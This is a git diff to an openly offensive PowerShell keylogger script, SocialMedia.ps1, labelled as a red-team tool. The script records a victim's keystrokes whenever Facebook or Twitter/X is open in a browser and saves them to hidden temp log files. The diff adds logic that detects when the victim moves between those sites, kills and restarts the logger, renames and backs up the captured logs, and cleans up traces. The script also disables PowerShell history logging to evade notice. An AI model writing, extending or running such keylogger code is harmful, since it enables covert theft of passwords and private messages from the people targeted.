@@ -5,8 +5,8 @@
    Author: @r00t-3xp10it
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
-   Optional Dependencies: UserLand,Administrator
-   PS cmdlet Dev version: v1.2.8
+   Optional Dependencies: UserLand
+   PS cmdlet Dev version: v1.3.8
    
 .DESCRIPTION
    Capture target keyboard keystrokes if facebook or
@@ -68,7 +68,7 @@
    None. You cannot pipe objects into SocialMedia.ps1
 
 .OUTPUTS
-   * Social media key`logger
+   ╰➤ Social media key`logger!
 
    Social Media: Facebook
    Logfile: 1_sdfsrs.Facebook
@@ -97,14 +97,14 @@
 )
 
 
-$CmdletVersion = "v1.2.8"
+$CmdletVersion = "v1.3.8"
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $host.UI.RawUI.WindowTitle = "@SocialMedia $CmdletVersion {SSA@RedTeam}"
 If(-not($AutoDel.IsPresent))
 {
-   write-host "`n* Social media key`logger`n" -ForegroundColor Green
+   write-host "`n  ╰➤ Social media key`logger!" -ForegroundColor Green
 }
 
 ## Browser names
@@ -227,8 +227,83 @@ If($Action -iMatch '^(start)$')
             $StartKeys = (Get-Process -Name "$Item").MainWindowTitle|Where-Object{$_ -NotMatch '^(0)$'}|Where-Object{$_ -ne ''}
             If(($StartKeys -iMatch 'Facebook') -or ($StartKeys -iMatch '/ X |Twitter.com'))
             {
-               If($StartKeys -imatch 'Facebook'){$SocialSite = "Facebook"}
-               If($StartKeys -imatch '/ X |twitter.com'){$SocialSite = "Twitter"}
+
+               ## Smeagol -- Detect social media change
+               If(Test-Path -Path "$Env:TMP\Smeagol.log")
+               {
+                  If($StartKeys -imatch 'Facebook'){$SocialSite = "Facebook"}
+                  If($StartKeys -imatch '/ X |twitter.com'){$SocialSite = "Twitter"}
+                  $Aristoteles = (Get-Content -Path "$Env:TMP\Smeagol.log" -EA SilentlyContinue)
+
+                  If(-not($Aristoteles -match "^($SocialSite)$"))
+                  {
+                     write-host "   ╰➤ " -ForegroundColor Green -NoNewline
+                     write-host "move detected from " -ForegroundColor Red -NoNewline
+                     write-host "$Aristoteles" -ForegroundColor Green -NoNewline
+                     write-host " to " -ForegroundColor Red -NoNewline
+                     write-host "$SocialSite" -ForegroundColor Green
+
+                     ## Stop key`logger PID(s)
+                     If(Test-Path -Path "$Env:TMP\pid.log")
+                     {
+                        ## Get key`logger PPID(s) from logfile
+                        $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })
+
+                        ## Kill Process PID(s)
+                        ForEach($NewThing in $PPID)
+                        {
+                           ## Check if process ID its running before try to stop it.
+                           If([bool](Get-Process -Id "$NewThing" -EA SilentlyContinue) -Match 'True')
+                           {
+                              ## Stop key`logger process by is PPID
+                              write-host "   ╰➤ " -ForegroundColor Green -NoNewline
+                              write-host "Stoping key`logger PID: " -NoNewline
+                              write-host "$NewThing" -ForegroundColor Green
+                              Stop-Process -Id $NewThing -Force
+                           }
+                        }
+
+                        ## CleanUp -- Rename
+                        If(Test-Path -Path "$Env:TMP\void.log")
+                        {
+                           [int]$Counter = [int]$Counter+1
+                           ## Random FileName generation - rename logfile [name+extension]
+                           # This allows attackers to stop key`logger if target its not on social media
+                           $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
+                     
+                           $Name = "$Counter"+"_"+"$Rand" -join '' ## Add $Counter to beggining of Name to order creation
+                           Move-Item -Path "$Env:TMP\void.log" -Destination "$Env:TMP\${Name}.${Aristoteles}" -Force
+
+                           ## Print info onscreen
+                           write-host "   ╰➤ " -ForegroundColor Green -NoNewline
+                           write-host "logfile: " -NoNewline
+                           write-host "void.log" -ForegroundColor Yellow -NoNewline
+                           write-host " renamed to: " -NoNewline
+                           write-host "${Name}.${Aristoteles}" -ForegroundColor Yellow
+
+                           ## CleanUP
+                           Remove-Item -Path "$Env:TMP\pid.log" -Force
+                           Remove-Item -Path "$Env:TMP\Smeagol.log" -Force
+                           Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Twitter" -Force
+                           Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Facebook" -Force
+                        }
+                     }
+                  }
+               }## Smeagol function
+
+
+               ## Store last access social media
+               If($StartKeys -imatch 'Facebook')
+               {
+                  $SocialSite = "Facebook"
+                  echo "$SocialSite" > $Env:TMP\Smeagol.log
+               }
+               If($StartKeys -imatch '/ X |twitter.com')
+               {
+                  $SocialSite = "Twitter"
+                  echo "$SocialSite" > $Env:TMP\Smeagol.log
+               }
+
 
                ## If pid.log does not exist = Start process
                If(-not(Test-Path -Path "$Env:TMP\pid.log"))
@@ -244,8 +319,10 @@ If($Action -iMatch '^(start)$')
                   Start-Sleep -Milliseconds 1600 # Give extra time for execution
                }
 
+               ## Key`logger running -- backup void.log logfile
                write-host "   > key`logger running in background!"
                Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.${SocialSite}" -force
+
             }
             Else
             {
@@ -262,7 +339,9 @@ If($Action -iMatch '^(start)$')
                      If([bool](Get-Process -Id "$Thing" -EA SilentlyContinue) -Match 'True')
                      {
                         ## Stop key`logger process by is PPID
-                        write-host "   > Stoping key`logger PID: $Thing" -ForegroundColor Green
+                        write-host "   ╰➤ " -ForegroundColor Green -NoNewline
+                        write-host "Stoping key`logger PID: " -NoNewline
+                        write-host "$Thing" -ForegroundColor Green
                         Stop-Process -Id $Thing -Force
                      }
                   }
@@ -278,7 +357,8 @@ If($Action -iMatch '^(start)$')
                      Move-Item -Path "$Env:TMP\void.log" -Destination "$Env:TMP\${Name}.${SocialSite}" -Force
 
                      ## Print info onscreen
-                     write-host "   > logfile: " -NoNewline
+                     write-host "   ╰➤ " -ForegroundColor Green -NoNewline
+                     write-host "logfile: " -NoNewline
                      write-host "void.log" -ForegroundColor Yellow -NoNewline
                      write-host " renamed to: " -NoNewline
                      write-host "${Name}.${SocialSite}" -ForegroundColor Yellow
@@ -363,6 +443,8 @@ If($Action -iMatch '^(stop)$')
 
       ## CleanUP
       Remove-Item -Path "$Env:TMP\*.log" -Force
+      Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Twitter" -Force
+      Remove-Item -Path "$Env:TMP\AUTO_BACKUP.Facebook" -Force
    }
    Else
    {
